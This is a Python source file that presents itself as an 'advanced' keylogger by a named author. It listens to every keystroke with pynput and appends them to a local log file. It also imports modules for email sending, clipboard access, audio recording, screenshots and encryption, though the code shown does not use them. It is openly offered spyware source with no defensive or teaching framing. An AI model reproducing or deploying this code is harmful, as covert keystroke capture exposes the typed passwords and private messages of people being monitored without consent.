# This is a sort of "advanced" keylogger made by gobinathan-l. If you are using this tool, kindly make sure you installed all the Modules.

#Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography import fernet
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

#Log File Info
keylogs = "keylogs.txt"
keypath = "D:\\Docs\\My Python Projects\\7 Pylogger (My Keylogger based on Python)"
extend  = "\\"

count = 0
keys  = []

#Functions for Different Key Events
def on_press(key):
    global count, keys
    print(key)
    keys.append(key)
    count +=1
    if count >=1:
        count = 0
        write_logs(keys)
        keys = []

def write_logs(keys):
    with open(keypath + extend + keylogs, "a") as logs:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0: # To add a new line after a Space
                logs.write("\n")
                logs.close()
            elif k.find("Key") == -1:
                logs.write(k)
                logs.close

def on_release(key):
    if key == Key.esc:
        return False # Exits when Escape is pressed

with Listener(on_press=on_press, on_release=on_release) as Listsner:
    Listsner.join()
